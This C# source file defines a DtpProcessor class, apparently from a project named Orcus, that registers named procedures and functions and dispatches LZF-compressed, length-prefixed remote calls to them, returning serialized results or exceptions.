using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Text;
using Orcus.Shared.Compression;
using Orcus.Shared.NetSerializer;

namespace Orcus.Shared.DataTransferProtocol
{
    /// <summary>
    ///     Receives data from <see cref="DtpFactory" /> executes the command and responses. The <see cref="DtpProcessor" /> is
    ///     the processing module of the connection. This should be populated at the  server's side
    /// </summary>
    public class DtpProcessor
    {
        /// <summary>
        ///     A function responses with an object.
        /// </summary>
        /// <param name="parameters">Parameters given by the <see cref="DtpFactory" /></param>
        /// <returns>Returns an object which should get sent back to the <see cref="DtpFactory" /></returns>
        public delegate object DtpFunction(DtpParameters parameters);

        /// <summary>
        ///     A procedure just does some stuff
        /// </summary>
        /// <param name="parameters">Parameters given by the <see cref="DtpFactory" /></param>
        public delegate void DtpProcedure(DtpParameters parameters);

        private readonly Dictionary<string, DtpFunction> _functions;
        private readonly Dictionary<string, DtpProcedure> _procedures;
        private readonly Dictionary<string, Type[]> _specialTypes;

        /// <summary>
        ///     Initialize a new instance of <see cref="DtpProcessor" />
        /// </summary>
        public DtpProcessor()
        {
            _procedures = new Dictionary<string, DtpProcedure>();
            _functions = new Dictionary<string, DtpFunction>();
            _specialTypes = new Dictionary<string, Type[]>();
        }

        /// <summary>
        ///     Initialize a new instance of <see cref="DtpProcessor" /> which gets the methods from the object using reflection
        ///     (mark methods with the <see cref="DataTransferProtocolMethodAttribute" />)
        /// </summary>
        /// <param name="processorObject">The object which contains method with the <see cref="DataTransferProtocolMethodAttribute" /></param>
        public DtpProcessor(object processorObject) : this()
        {
            foreach (var methodInfo in processorObject.GetType().GetMethods())
            {
                var attribute =
                    methodInfo.GetCustomAttributes(false).OfType<DataTransferProtocolMethodAttribute>().FirstOrDefault();
                if (attribute == null)
                    continue;

                var methodName = attribute.MethodName ?? methodInfo.Name;

                if (methodInfo.ReturnType == typeof (void))
                    _procedures.Add(methodName,
                        parameters => methodInfo.Invoke(processorObject, GetParameters(parameters, methodInfo)));
                else
                    _functions.Add(methodName,
                        parameters => methodInfo.Invoke(processorObject, GetParameters(parameters, methodInfo)));

                if (attribute.ReturnTypes?.Length > 0)
                    _specialTypes.Add(methodName, attribute.ReturnTypes);
            }
        }

        private static object[] GetParameters(DtpParameters dtpParameters, MethodInfo methodInfo)
        {
            var methodParameters = methodInfo.GetParameters();
            var parameters = new object[methodParameters.Length];
            for (int i = 0; i < methodParameters.Length; i++)
            {
                var methodParameterInfo = methodParameters[i];
                var parameterAttribute =
                    methodParameterInfo.GetCustomAttributes(false)
                        .OfType<ProcessorMethodParameterAttribute>()
                        .FirstOrDefault();

                parameters[i] = dtpParameters.GetValue(i, methodParameters[i].ParameterType, parameterAttribute?.Types);
            }

            return parameters;
        }

        /// <summary>
        ///     An unhandled exception occurred on execution of a method
        /// </summary>
        public event EventHandler<UnhandledExceptionEventArgs> ExceptionOccurred;

        /// <summary>
        ///     Register a new procedure
        /// </summary>
        /// <param name="procedureName">The name of the procedure. It must be unique, else an exception gets thrown</param>
        /// <param name="dtpProcedure">The delegate which gets executed when a request is received</param>
        public void RegisterProcedure(string procedureName, DtpProcedure dtpProcedure)
        {
            if (_procedures.ContainsKey(procedureName) || _functions.ContainsKey(procedureName))
                throw new InvalidOperationException();

            _procedures.Add(procedureName, dtpProcedure);
        }

        /// <summary>
        ///     Register a new function
        /// </summary>
        /// <param name="functionName">The name of the function. It must be unique, else an exception gets thrown</param>
        /// <param name="dtpFunction">The delegate which gets executed when a request is received</param>
        /// <param name="specialTypes">
        ///     Types which aren't obvious (e. g. if abstract classes are used) for the return value in
        ///     order to serialize it correctly
        /// </param>
        public void RegisterFunction(string functionName, DtpFunction dtpFunction, params Type[] specialTypes)
        {
            if (_functions.ContainsKey(functionName) || _procedures.ContainsKey(functionName))
                throw new InvalidOperationException();

            _functions.Add(functionName, dtpFunction);
            if (specialTypes != null && specialTypes.Length > 0)
                _specialTypes.Add(functionName, specialTypes);
        }

        /// <summary>
        ///     Process the received data from a <see cref="DtpFactory" />
        /// </summary>
        /// <param name="data">The data which was given using the <see cref="DtpFactory.SendDataAction" /> delegate</param>
        /// <returns>Returns the response which must get processed in <see cref="DtpFactory.Receive" /></returns>
        public byte[] Receive(byte[] data)
        {
            return Receive(data, 0);
        }

        /// <summary>
        ///     Process the received data from a <see cref="DtpFactory" />
        /// </summary>
        /// <param name="data">The data which was given using the <see cref="DtpFactory.SendDataAction" /> delegate</param>
        /// <param name="start">The start position of the byte array</param>
        /// <returns>Returns the response which must get processed in <see cref="DtpFactory.Receive" /></returns>
        public byte[] Receive(byte[] data, int start)
        {
            data = LZF.Decompress(data, start);
            var functionNameLength = BitConverter.ToInt32(data, 16);
            var functionName = Encoding.UTF8.GetString(data, 20, functionNameLength);
            if (!_procedures.ContainsKey(functionName) && !_functions.ContainsKey(functionName))
            {
                ExceptionOccurred?.Invoke(this,
                    new UnhandledExceptionEventArgs(
                        new InvalidOperationException($"Method with name {functionName} not found")));

                var errorResponse = new byte[16 + functionNameLength];
                Array.Copy(DtpFactory.FunctionNotFoundExceptionGuid.ToByteArray(), errorResponse, 16);
                Array.Copy(data, 20, errorResponse, 16, functionNameLength);
                return errorResponse;
            }

            var parameterCount = BitConverter.ToInt32(data, 20 + functionNameLength);

            var parameterLengths = new List<int>();
            var parameters = new Dictionary<int, byte[]>();

            for (int i = 0; i < parameterCount; i++)
                parameterLengths.Add(BitConverter.ToInt32(data, 24 + functionNameLength + i*4));

            var offset = 0;
            for (int i = 0; i < parameterCount; i++)
            {
                var parameterData = new byte[parameterLengths[i]];
                Array.Copy(data, 24 + functionNameLength + parameterCount*4 + offset, parameterData, 0,
                    parameterData.Length);
                parameters.Add(i, parameterData);
                offset += parameterData.Length;
            }

            var dtpParameters = new DtpParameters(parameters);
            byte[] result = null;

            try
            {
                DtpProcedure procedure;
                if (_procedures.TryGetValue(functionName, out procedure))
                {
                    procedure.Invoke(dtpParameters);
                }
                else
                {
                    DtpFunction function;
                    if (_functions.TryGetValue(functionName, out function))
                    {
                        var returnedObject = function.Invoke(dtpParameters);

                        if (returnedObject != null)
                        {
                            var typeList = new List<Type> {returnedObject.GetType()};
                            Type[] specialTypes;
                            if (_specialTypes.TryGetValue(functionName, out specialTypes))
                                typeList.AddRange(specialTypes);

                            result = new Serializer(typeList).Serialize(returnedObject);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                var exception = new DtpException
                {
                    Message = ex.Message,
                    StackTrace = ex.StackTrace,
                    FunctionName = functionName,
                    ParameterInformation = string.Join(", ",
                        parameters.Select(x => x.Key + " - " + x.Value.Length + " B").ToArray()),
                    SessionGuid = new Guid(data.Take(16).ToArray())
                };

                var exceptionData = new Serializer(typeof (DtpException)).Serialize(exception);
                var errorResponse = new byte[16 + exceptionData.Length];
                Array.Copy(DtpFactory.ExceptionGuid.ToByteArray(), errorResponse, 16);
                Array.Copy(exceptionData, 0, errorResponse, 16, exceptionData.Length);

                ExceptionOccurred?.Invoke(this, new UnhandledExceptionEventArgs(ex));
                return LZF.Compress(errorResponse, 0);
            }

            var response = new byte[16 + 4 + (result?.Length ?? 0)];
            //Protocol
            //HEAD  - 16 Bytes      - Guid
            //HEAD  - 4 Bytes       - Response Length
            //DATA  - result.Length - Result Length
            Array.Copy(data, 0, response, 0, 16); //copy guid
            Array.Copy(BitConverter.GetBytes(result?.Length ?? 0), 0, response, 16, 4);
            if (result != null)
                Array.Copy(result, 0, response, 20, result.Length);

            return LZF.Compress(response, 0);
        }
    }
}